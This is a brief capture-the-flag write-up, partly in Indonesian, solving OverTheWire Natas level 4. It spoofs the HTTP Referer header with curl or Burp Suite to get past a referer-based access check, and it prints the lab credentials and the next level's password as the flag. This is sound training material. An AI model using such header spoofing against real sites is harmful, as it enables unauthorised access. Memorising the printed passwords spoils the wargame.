# soal
Username: natas4
URL:      http://natas4.natas.labs.overthewire.org

# solve
- use cred natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
- use the curl, burp suite, third party extension (header editor)
  - and change the request header with 
  ```
  Referer: http://natas5.natas.labs.overthewire.org/
  # gunakan / akhir karena ketika saya coba tanpa / tidak bisa
  ```
- jika menggunakan curl
```bash
curl http://natas4.natas.labs.overthewire.org -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -H "Referer: http://natas5.natas.labs.overthewire.org/"
# Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

## HTTP Referer
- Referer: <url>
- dalah salah satu header HTTP yang digunakan untuk memberi tahu server dari mana asal pengguna sebelum mengakses halaman tertentu. Fungsinya adalah untuk memberi konteks kepada server tentang halaman sebelumnya yang "mengacu" atau "merujuk" ke halaman saat ini.

# flag
0n35PkggAPm2zbEpOU802c0x0Msn1ToK